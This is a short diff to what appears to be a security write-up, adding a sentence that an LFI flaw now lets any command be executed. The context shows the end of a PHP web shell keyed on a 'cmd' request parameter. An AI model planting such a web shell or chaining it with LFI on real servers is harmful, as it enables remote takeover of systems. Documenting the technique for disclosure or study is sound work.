@@ -23,5 +23,7 @@ if(isset($_REQUEST['cmd'])) {
 }
 ?>
 ```
+
+Now, we can execute any command using the LFI vulnerability.
 ![image](https://github.com/user-attachments/assets/283efb94-662c-4f11-ba51-5d2e4d591e7f)
 
